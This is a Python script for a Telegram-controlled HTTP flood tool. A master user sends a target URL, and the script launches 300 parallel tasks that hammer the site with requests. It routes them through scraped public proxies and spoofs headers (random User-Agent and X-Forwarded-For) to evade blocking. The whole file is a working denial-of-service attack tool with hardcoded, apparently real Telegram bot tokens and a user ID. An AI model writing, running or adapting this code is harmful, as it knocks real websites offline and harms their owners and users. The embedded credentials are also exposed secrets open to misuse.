import asyncio
import aiohttp
import random
import time
from aiohttp import web

MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0",
    "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE",
    "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI",
    "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo",
    "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI",
    "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}
MASTER_ID = 1938591484

class SovereignUltimateCore:
    def __init__(self):
        self.m_token = MASTER_TOKEN
        self.army = SLAVE_ARMY
        self.targets = {}
        self.replied_flags = {}
        self.active_tasks = []
        self.session = None

    async def _notify(self, text, token=None, chat_id=MASTER_ID):
        url = f"https://api.telegram.org/bot{token or self.m_token}/sendMessage"
        try:
            async with self.session.post(url, json={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=10) as r:
                return await r.json()
        except: pass

    async def _get_proxies(self):
        try:
            async with self.session.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000", timeout=10) as r:
                return (await r.text()).splitlines() if r.status == 200 else []
        except: return []

    async def _verify_alive(self, slot, token, name):
        await asyncio.sleep(5)
        if not self.replied_flags.get(slot):
            try:
                async with self.session.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10) as r:
                    d = await r.json()
                    m = f"💀 {slot} ({name}) অফলাইন!" if not d.get("ok") else f"⚠️ {slot} ({name}) ৫ সেকেন্ডে উত্তর দেয়নি!"
                    await self._notify(m)
            except: pass
        self.replied_flags[slot] = False

    async def _strike_task(self, target, proxies):
        while target in self.targets:
            proxy = random.choice(proxies) if proxies else None
            p_url = f"http://{proxy}" if proxy else None
            h = {
                'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(115, 126)}.0.0.0 Safari/537.36",
                'X-Forwarded-For': ".".join(map(str, (random.randint(1, 255) for _ in range(4)))),
                'Accept': '*/*', 'Connection': 'keep-alive'
            }
            try:
                async with self.session.get(target, headers=h, proxy=p_url, timeout=5) as r:
                    self.targets[target] += 1
            except: pass
            await asyncio.sleep(0.0001)

    async def handle_updates(self):
        offset = 0
        while True:
            try:
                url = f"https://api.telegram.org/bot{self.m_token}/getUpdates?offset={offset}&timeout=20"
                async with self.session.get(url, timeout=25) as r:
                    data = await r.json()
                    if not data or not data.get('ok'):
                        await asyncio.sleep(1)
                        continue
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {})
                        text = msg.get('text', '')
                        uid = msg.get('from', {}).get('id', 0)
                        if uid != MASTER_ID: continue
                        if text.startswith("http"):
                            self.targets[text] = 0
                            p_list = await self._get_proxies()
                            await self._notify(f"⚔️ **SYSTEM STRIKE ACTIVATED**\nTarget: {text}\nNodes: {len(self.army)}\nParallel Tasks: 300")
                            for _ in range(300):
                                task = asyncio.create_task(self._strike_task(text, p_list))
                                self.active_tasks.append(task)
                        elif text == "/stop":
                            self.targets.clear()
                            for t in self.active_tasks:
                                if not t.done(): t.cancel()
                            self.active_tasks.clear()
                            await self._notify("🛑 **SYSTEM HALTED & MEMORY CLEANED**")
                        elif text in ["/army", "/start"]:
                            rep = "📊 **ARMY LIVE STATUS REPORT:**\n"
                            tasks = [self.session.get(f"https://api.telegram.org/bot{tk}/getMe", timeout=10) for tk in self.army.values()]
                            resps = await asyncio.gather(*tasks, return_exceptions=True)
                            for i, (s, tk) in enumerate(self.army.items()):
                                try:
                                    rd = await resps[i].json()
                                    rep += f"✅ {s}: @{rd['result']['username']}\n" if rd.get("ok") else f"❌ {s}: DEAD\n"
                                except: rep += f"❌ {s}: ERROR\n"
                            await self._notify(rep)
                        else:
                            for s, tk in self.army.items():
                                try:
                                    async with self.session.get(f"https://api.telegram.org/bot{tk}/getMe", timeout=5) as rb:
                                        d = await rb.json()
                                        if d.get("ok") and f"@{d['result']['username']}" in text:
                                            self.replied_flags[s] = False
                                            asyncio.create_task(self._verify_alive(s, tk, d['result']['first_name']))
                                            await self._notify("🤖 **হাজির মালিক!**", token=tk)
                                            self.replied_flags[s] = True
                                except: pass
            except: await asyncio.sleep(1)

async def main():
    core = SovereignUltimateCore()
    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=conn) as sess:
        core.session = sess
        app = web.Application()
        app.router.add_get('/', lambda r: web.Response(text="GOD_MODE_ONLINE_V6"))
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 10000)
        await asyncio.gather(site.start(), core.handle_updates())

if __name__ == "__main__":
    try: asyncio.run(main())
    except (KeyboardInterrupt, SystemExit): pass
    except: pass
        
